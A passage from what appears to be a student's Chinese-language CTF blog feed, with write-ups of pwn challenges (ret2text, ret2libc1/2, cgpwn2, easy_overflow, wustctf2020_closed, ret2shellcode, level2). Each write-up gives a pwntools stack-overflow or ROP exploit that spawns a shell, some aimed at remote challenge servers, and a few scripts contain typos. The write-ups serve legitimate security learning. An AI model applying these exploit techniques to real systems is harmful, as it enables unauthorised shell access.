+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>大体思路就是输入一堆测试数据然后调试看在那个输入点报错了，这个输入点就是刚好溢出的那个点，然后计算偏移量即可<br>先用cyclic生成有序字符队列<br><img data-src="https://pic4.zhimg.com/80/v2-3a1996514eab734175f5c32518ac5dc7_1440w.webp"><br>运行并输入生成的字符串<br><img data-src="https://pic4.zhimg.com/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br>得到invalid addres  0x62616164<br>用cyclic -l查找偏移量<br><img data-src="https://pic1.zhimg.com/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./ret2text&#x27;)</span><br><span class="line">success_addr = 0x0804863A</span><br><span class="line">payload = b&#x27;a&#x27; * 112  + p32(success_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T3</title>
+    <url>/posts/af8a739b/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2libc1"><a href="#T3-ret2libc1" class="headerlink" title="T3 ret2libc1"></a>T3 ret2libc1</h2><blockquote>
+<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x00-ctf-wiki中的原理解释"><a href="#0x00-ctf-wiki中的原理解释" class="headerlink" title="0x00  ctf-wiki中的原理解释"></a>0x00  ctf-wiki中的原理解释</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。<br><strong>0x01</strong><br>file checksec——32-bit，开启NX<br><img data-src="https://pic2.zhimg.com/80/v2-80ff23ddf6fa9ad28c2d42d4fbe68d4d_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，应该是gets函数的栈溢出<br><img data-src="https://pic2.zhimg.com/80/v2-5733f1e4a386a4ef5c7316035cb5a505_1440w.webp"><br>shift+f12看到有&#x2F;bin&#x2F;sh字符串,找地址为0x08048720<br><img data-src="https://pic4.zhimg.com/80/v2-db2ae8bc45848b27958075060c1762db_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-02907b4345d742100845714228c18270_1440w.webp"><br>并且在secure函数中有system函数，双击进去查看得到 system 函数地址为08048460<br><img data-src="https://pic4.zhimg.com/80/v2-d54eba26d72dbf06930f7d203b44307f_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>gdb调试找偏移量<br><img data-src="https://pic4-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-e46dcabf469631f89dca3965244aacef_1440w.webp"><br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br><del>可能都是ctf-wiki里面的题的原因吧这里甚至连偏移量都和前面ret2text的一样</del></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>我们要直接返回执行system 函数，exp可以这样写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_addr = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_addr,b &#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里的四个b是system函数的返回地址，这里只是起到让结构合法的作用，具体是什么不重要，因为我们只需要调用system就行了<br><del>我这个flat（）还查了好久是什么意思……实际上就是把几个字符串拼接在一起</del></p>
+<h3 id="0x05-questions"><a href="#0x05-questions" class="headerlink" title="0x05 questions"></a>0x05 questions</h3><p>也可以直接返回system函数压参的地址0x0804860A(也就是 call    _system处的地址)而不返回函数的 plt 处，<br>但是32位一般返回plt处地址后先跟函数返回地址（虚拟的）再接参数<br>一个plt表和got表的<a href="https://detlfy-github-io-s.atrust.sdu.edu.cn:81/2021/09/29/Linux%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E4%B8%8E%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6/">教学文章</a></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T4</title>
+    <url>/posts/31eee638/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T4-ret2libc2"><a href="#T4-ret2libc2" class="headerlink" title="T4 ret2libc2"></a>T4 ret2libc2</h2><blockquote>
+<p>2023-01-09WP<br>ctf-wiki 基础rop</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>拖入IDA看看<br>危险函数和ret2libc1相同都是gets<br>不同的是这次没有&#x2F;bin&#x2F;sh给我们用了<del>我还找了好久来着……</del><br>但是system函数还是有的<br>那我们先找出system的地址0x08048490<br><img data-src="https://pic1.zhimg.com/80/v2-d7208c51601dfd63bece7bfa14f509f4_1440w.webp"><br>接下来我们得想办法弄出个&#x2F;bin&#x2F;sh来<br>由于程序已经开启NX保护，我们无法直接写入栈<br>所以思考在bss段写入字符串  说实话，这个地方第一次看真的怎么都想不到……<br>然后接下来我又不会了，怎么找到bss…….博客上好多方法看得我头晕目眩，又还不会用ROPgadget……<br>最后我直接在IDA里快捷键G了一下跳到了.bss段<br>发现里面有个buff2(设计好了的吧？)，我们可以用gets函数写入&#x2F;bin&#x2F;sh到buff2<br><img data-src="https://pic1.zhimg.com/80/v2-02c0edc80f9a8a5d0576827773403920_1440w.webp"><br>去找gets的地址  得到0x8048460<br><img data-src="https://pic1.zhimg.com/80/v2-5ccf0533f58826d407436ee4665c121c_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb暴力求出偏移量<br><img data-src="https://pic1-zhimg-com-s.atrust.sdu.edu.cn:81/80/v2-4c9106613db51cfa2abc68482b270b40_1440w.webp"><br>终于可以写exp了</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat( [b&#x27;a&#x27; * 112, gets_plt,   system_plt, buf2,buf2])</span><br><span class="line">#先覆盖溢出，返回gets函数的地址，</span><br><span class="line">#接着返回执行system函数的地址，然后传入gets函数参数buf2的地址,system函数的参数buf2</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>这篇<a href="https://zhuanlan.zhihu.com/p/53357764#:~:text=%E5%85%B6%E4%B8%AD%E5%85%B3%E9%94%AE%E7%9A%84%E4%BB%A3%E7%A0%81%E6%98%AF%EF%BC%9A%20payload%20%3D%20flat%20%28%5B%27a%27%20%2A%20112%2C%20gets_plt%2C,buf2%2C%20system_plt%2C%200xabcdabcd%2C%20buf2%5D%29%20%E7%9B%B8%E4%BF%A1%E6%9C%89%E7%9A%84%E6%9C%8B%E5%8F%8B%E4%BC%9A%E4%B8%8D%E6%98%8E%E7%99%BD%EF%BC%8C%E4%B8%BA%E5%95%A5%E6%9C%89%E4%B8%AA%20%5Bgets_plt%2C%20pop_ebp%2C%20buf2%5D%EF%BC%8C%E8%BF%99%E6%A0%B7%E7%9A%84payload%E5%B8%83%E7%BD%AE%E3%80%82">文章</a>和这篇<a href="https://www.jianshu.com/p/4928e726a43f">博客</a>挺不错的<br>还有<a href="https://blog.csdn.net/ATFWUS/article/details/104565483">这篇</a></p>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>ctf-wiki的exp是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<p>[‘a’ * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]为啥还需要一个 pop_ebx呢？<br>好像看到有博客说是为了堆栈平衡<br>其实就是用了两个gadget<br>在调用gets函数后，把参数buf2给pop掉，这样返回地址就变成了system，就会返回到system</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week2 T5</title>
+    <url>/posts/46e9d6ae/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-cgpwn2"><a href="#T5-cgpwn2" class="headerlink" title="T5 cgpwn2"></a>T5 cgpwn2</h2><blockquote>
+<p>2023-01-09WP<br>攻防世界 pwn题</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit，开启NX保护</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA中打开window发现这题又是一个找不到&#x2F;bin&#x2F;sh的<br>但是在pwn函数中还是找到了system函数的<br><img data-src="https://pic4.zhimg.com/80/v2-068880d6f0f1427b812cd98bee561577_1440w.webp"><br>然后我们来看hello函数的反汇编代码<br><img data-src="https://pic4.zhimg.com/80/v2-c5dd01b36ac83fcdc19cf8ed3f804d0b_1440w.webp"><br>好像有点复杂，简单来说就是前面先定义了一堆变量，然后条件判断先不看了先看后面的<br>首先要求我们输入一个名字，通过fgets函数完成，并且从键盘最多只能读取32h个字符到name<br>然后再通过gets函数从键盘读取字符到s区域，没有输入字符数量的限制<br>其中name是bss段的一个大小为34的区域，<br><img data-src="https://pic3.zhimg.com/80/v2-a6b3d88fcbe601a724cad07d655b85f6_1440w.webp"><br>s是长度为0x26个字节的区域<br><img data-src="https://pic1.zhimg.com/80/v2-a33446043ab1e9de86ee374db4c9dd28_1440w.webp"><br>于是我们可以向name区域输入&#x2F;bin&#x2F;sh,然后让这个地址作为system函数的参数，而s则用来进行栈溢出，并让溢出的返回地址为system函数的地址</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = remote(’61.147.171.105‘，51582)</span><br><span class="line">target = 0x804855A</span><br><span class="line">binsh = 0x804A080</span><br><span class="line">payload = b&#x27;a&#x27; * 0x26 +b &#x27;bbbb&#x27; #覆盖s和ebp的数据</span><br><span class="line">                 + p32(target) + p32(binsh)#返回gets函数的地址和参数</span><br><span class="line">a = r.recvuntil(&#x27;e\n&#x27;)</span><br><span class="line">p.sendline(&#x27;/bin/sh&#x27;)#向fget函数发送字符串</span><br><span class="line">a = r.recvuntil(&#x27;:\n&#x27;)#等待接受到括号内的信息后再运行下面的内容</span><br><span class="line">p.sendline(payload)#发送payload</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>好像不要a &#x3D; r.recvuntil(‘e\n’)，a &#x3D; r.recvuntil(‘:\n’)也可以……</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week3 T1</title>
+    <url>/posts/f93875d2/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T1-easy-overflow"><a href="#T1-easy-overflow" class="headerlink" title="T1 easy_overflow"></a>T1 easy_overflow</h2><blockquote>
+<p>2023-01-14WP<br>Hgame week1 pwn 第二题<br>考点：简单栈溢出</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p><strong>file</strong>——64-bit,<br><strong>checksec</strong> 开启NX<br><img data-src="https://picx.zhimg.com/80/v2-b02ac7a02df1467f41fa6b8ed8ecf147_1440w.png?source=d16d100b"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p><strong>IDA</strong>看源码，先找&#x2F;bin&#x2F;sh，一路索引过去发现在一个后门函数中</p>
+<p><img data-src="https://picx.zhimg.com/80/v2-9e559b87dc3591a21383567579e57aec_1440w.png?source=d16d100b"></p>
+<p><img data-src="https://pic1.zhimg.com/80/v2-6c43653aae10a9334f6d4a773827dcae_1440w.png?source=d16d100b"></p>
+<p>然后我的第一反应是先记下call system的地址，结果一看，没找到？取而代之的是call    sub_401060<br>于是我卡了一下，可能是第一次碰到这样的题的缘故，我没有意识到函数名称可以是不一样的<br>打开main函数伪代码也是这样……<br><img data-src="https://pic1.zhimg.com/80/v2-d944638581f5f4e8ed3bb1f91435d464_1440w.webp"><br>越看越不对劲，搜索资料才发现这种题的风格就是去符号使原函数名字无法显示<br>这么说IDA无法解决了</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>我们转而动态调试试一下<br>我们假设文件带有system函数，又据题意应该是有gets或者read之类的函数的<br>运行文件测试一下确实如此<br><img data-src="https://pic1.zhimg.com/80/v2-c0c3d1d2b64d886ff2b0c795be14315c_1440w.webp"><br>那么我们在这几个函数处试着打断点<br><img data-src="https://pic3.zhimg.com/80/v2-ff2f8659b478bef6651b656f3a5ee762_1440w.webp"><br>我们可以看到，其中system的地址和后面函数中的call    sub_401060的plt处地址对上了<br>read函数的地址和main函数中的 call    sub_401080的plt处地址对上了<br>同时呢，gdb运行文件的时候还发现main函数中还有一个close函数，浏览一下main函数源码只有sub_401070了<br><img data-src="https://pic2.zhimg.com/80/v2-4d7a5a5c48c6c578df4ef9f351eac149_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-8553dc620b792d521995f7e5718e1629_1440w.webp"><br>查阅了一些资料得知，close(1)关闭了标准输出，详细见这篇<a href="https://blog.csdn.net/xirenwang/article/details/104139866">文章</a><br>也就是有下面我们得到shell后无法在屏幕上看到flag的情况<br>这时候就要输入exec 1&gt;&amp;0重启标准输出<br>那么现在呢我们已经把文件里的几个主要函数分析好了，接下来就要找偏移量了</p>
+<h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><p>这一部分我发现一个很坑的地方，如果我们用ctf-wilki上的方法，那么我们在gdb调试设断点的时候就不能设 </p>
+<blockquote>
+<p>b read</p>
+</blockquote>
+<p>这样设的话我们直接就进入到read函数里了，那就无法看到储存数据的寄存器（不管是什么）距rsp或者rbp的偏移了<br>并且，此时已经开始进入read子函数，即已经分配了新的栈帧了，rsp已经移动，再去计算rsp和rbp的差值则会不准确</p>
+<blockquote>
+<p>b  *0x4011be</p>
+</blockquote>
+<p>我们应该这样设断点，这样就停止在进入read函数之前，不仅可以看到相对偏移,还能计算出rbp-rsp<br><img data-src="https://pic3.zhimg.com/80/v2-9efe6dca6df2fee543e1ebc2027b17de_1440w.webp"><br><img data-src="https://pic1.zhimg.com/80/v2-0d752265119152e7f608595ea4255d90_1440w.webp"><br>得出rsp和rsi 0x7fffffffddd0,rbp为0x7fffffffdde0,计算得距rbp偏移量就为0x7fffffffdde0-0x7fffffffddd0<br>那么再加上rbp求得为0x10+8</p>
+<p>还可以暴力求得  <del>懒得计算偏移量的话</del><br><img data-src="https://pic4.zhimg.com/80/v2-c7ec27fdfb682541c8a7d2aeb8e4c663_1440w.webp"></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>可以写exp</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>, <span class="number">30574</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 000000000401176</span><br><span class="line">payload = b <span class="string">&#x27; a &#x27;</span> * <span class="number">0x18</span> + p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好奇怪为什么官方的WP可以直接反汇编成正常的函数？<br>搜了一下好像可以手动添加标签,<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788796">这篇文章</a>教了一下这么回复库函数名，但是看不懂……</p>
+<h3 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h3><p><img data-src="https://pic4.zhimg.com/80/v2-23c72811fac836cd0c8980516e1acc83_1440w.webp"><br>得到shell后发现并没有办法显示出flag，问题就在之前的那个close(1)因为汇编代码中有这样一句</p>
+<blockquote>
+<p>mov     edi, 1</p>
+</blockquote>
+<p>所以认为close()括号里的参数时1<br>这时候需要使用命令让shell能够正常回显</p>
+<blockquote>
+<p>exec 1&gt;&amp;0</p>
+</blockquote>
+<p>累死了，终于拿到flag<br><img data-src="https://pic2.zhimg.com/80/v2-ee060de7086e6945edf7fda074674fa5_1440w.webp"></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>hgame</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week3 T2</title>
+    <url>/posts/60312468/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T2-wustctf2020-closed"><a href="#T2-wustctf2020-closed" class="headerlink" title="T2 wustctf2020_closed"></a>T2 wustctf2020_closed</h2><blockquote>
+<p>2023-01-15WP<br>BUUCTF  pwn<br>考点：close函数</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>做了hgame的第二题后，去补充了一下关于close函数的知识，再从BUUCTF中找了一题练了练<br>先file知道时64-bit</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>这一题结构很简单，再IDA中直接能找到在main函数中的vulnerable函数中return shell函数中有system函数<br>直接给好了<br><img data-src="https://pic2.zhimg.com/80/v2-bd22be15351c97aebae2de7f1bd0f4bd_1440w.webp"><br><img data-src="https://pic3.zhimg.com/80/v2-640c1ebbaa31c9a5013bd8feafceaee6_1440w.webp"><br><img data-src="https://pic4.zhimg.com/80/v2-2c7eb0afee1a164507dd332cf37e7813_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>但是因为</p>
+<blockquote>
+<p>close(1)<br>  close(2)</p>
+</blockquote>
+<p>将标准输出和标准错误输出关闭了，这样在窗口上看不到输出<br>这时候就需要我们重新定位标准输出</p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p><strong>补充一些知识</strong></p>
+<ul>
+<li><p>在Linux中的文件，文件描述符（file descriptor）是内核为了高效管理已被打开的文件所创建的索引，是一个非负整数（通常是小整数），用于指代被打开的文件，所有执行I&#x2F;O操作的系统调用都通过文件描述符。程序刚刚启动的时候，0是标准输入，1是标准输出，2是标准错误。如果此时去打开一个新的文件，它的文件描述符会是3。</p>
+</li>
+<li><p>标准输入输出的指向是默认的，也就是默认打开一个终端后，0，1，2都指向同一个位置也就是当前终端，我们可以修改它们的指向，也即重定位</p>
+</li>
+<li><p>我们可以将标准输出进行重定向</p>
+</li>
+<li><p>&amp;+文件描述符, 可以指代该文件(进程)</p>
+</li>
+</ul>
+<p>现在可以解决close函数的问题了<br>在同一个进程里面, 标准输出和标准输入的指向都是相同的终端. 由于标准输入没有被禁用，所以我们可以使用命令</p>
+<blockquote>
+<p>exec 1&gt;&amp;0</p>
+</blockquote>
+<p>让标准输出定位到标准输入的文件，也就相当于重启了标准输出<br>本质上即exec+重定向命令，只不过操作的是文件描述符<br>现在cat到的flag就能够输出了<br><img data-src="https://pic3.zhimg.com/80/v2-49e09c530cab090cb5dedbddbd1a8812_1440w.webp"><br><del>出题人很有意思，连接上环境第一件事是嘲讽一下你</del></p>
+<p><a href="https://blog.csdn.net/Y_peak/article/details/115406518">参考</a>    <a href="https://blog.csdn.net/Y_peak/article/details/115406518">文章</a></p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>BUUCTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week3 T3</title>
+    <url>/posts/173614fe/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T3-ret2shellcode-1-bss段写入"><a href="#T3-ret2shellcode-1-bss段写入" class="headerlink" title="T3 ret2shellcode 1  (bss段写入)"></a>T3 ret2shellcode 1  (bss段写入)</h2><blockquote>
+<p>2023-01-15WP<br>ctf-wiki pwn<br>考点：栈溢出 shellcode</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32bit，啥保护都没开<br><img data-src="https://pic1.zhimg.com/80/v2-c30ffe5ee07a9e5b5d0f124f011cc634_1440w.webp"></p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看源码，没有system函数和&#x2F;bin&#x2F;sh字符串<br>并且可以看到，main函数中，gets函数读取用户输入到变量s，strcnp将s中的字符串复制到buf2处<br><img data-src="https://pic3.zhimg.com/80/v2-da432353b394322fd2a9113c6042b0c6_1440w.webp"><br>buf2并没有在main函数中看到定义，应该是全局变量，进一步查看buf2在bss段中<br><img data-src="https://pic1.zhimg.com/80/v2-96ffdd44e368d33ff3f3def08797ce38_1440w.webp"></p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>通过vmmap我们可以查看bss段是否具有可执行权限<br><img data-src="https://pic1.zhimg.com/80/v2-3cac07ac2fda33db599f641decbd4a20_1440w.webp"><br>rw-p，可读可写<br>（这里操作上要注意一下，vmmap的命令要在程序运行时使用，可以给程序下断点或者ctrl+C停住程序再输命令）</p>
+<p><a href="https://ch4r1l3.github.io/2018/06/22/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%B8%89%E7%AB%A0%E2%80%94%E2%80%94gdb%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">参考资料</a></p>
+<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>有执行权限的话就可以向bss段写入shellcode了，之后控制程序返回执行shellcode<br>在写exp之前还要先计算偏移量，方法和ret2text类似，与之前的偏移量都是一样的<br>用gdb调试或者爆破求出偏移量为112<br>使用shellcraft.sh()生成shellcode，并且用shellcode.ljust()方法向左对齐补齐字符串，溢出填充返回地址<br>exp为</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p>好像shellcode写在栈或者bss段上都可以吧？</p>
+<p>网上看到一个解释说不能直接把shellcode写在栈上？不知道对不对：<br>绝大多数的操作系统都默认开启ASLR保护，这大大提高了攻击栈的难度。因此，栈应当是我们最后考虑的对象</p>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>ctf-wiki</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week3 T5</title>
+    <url>/posts/fe55b1cb/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="T5-level2"><a href="#T5-level2" class="headerlink" title="T5 level2"></a>T5 level2</h2><blockquote>
+<p>2023-01-15WP<br>攻防世界pwn题<br>考点：ret2libc1<br>（不是我不想往下做，而是往下做的话真的是要补太多知识了，新的知识还没学会，只好找一题来划一下水了……）</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file，checksec —— 32-bit，开启NX</p>
+<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA一看没啥，点进vuln函数找到一个read函数<br><img data-src="https://pic1.zhimg.com/80/v2-3f3caf9f6fe1b9fe6e5088a2e1619e2c_1440w.webp"><br><img data-src="https://pic2.zhimg.com/80/v2-3a54c2fc46d20dc1f7a6493a4fd40ba9_1440w.webp"><br>由图中我们可以看到，buf分配的空间为0x88,而read函数读取0x100，显然存在溢出<br>shift+f12找到有字符串&#x2F;bin&#x2F;sh，并且在vuln函数里有system函数，只不过参数是”ehco Input：”罢了<br>记下system函数的plt表地址0x08048320<br><img data-src="https://pic1.zhimg.com/80/v2-f2adaa287713c287b7d0b7070f687524_1440w.webp"></p>
+<p>这样就只需要我们覆盖buf，将system函数地址写为返回地址，并将&#x2F;bin&#x2F;sh作为参数传递其地址即可</p>
+<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>exp</p>
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27; 61.147.171.105 &#x27;</span>, <span class="number">60218</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x88</span> + <span class="number">4</span>) + p32(<span class="number">0x08048320</span>)+<span class="string">b&#x27;bbbb&#x27;</span> + p32(<span class="number">0x0804A024</span>)</span><br><span class="line"><span class="comment">#0x88为buf大小，+4是ebp大小，p32(0x08048320)是打包system地址，b&#x27;bbbb&#x27;是填充无效system返回地址， </span></span><br><span class="line"><span class="comment">#p32(0x0804A024)是/bin/sh地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>攻防世界</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>week4 T1</title>
+    <url>/posts/64ef4d6b/</url>
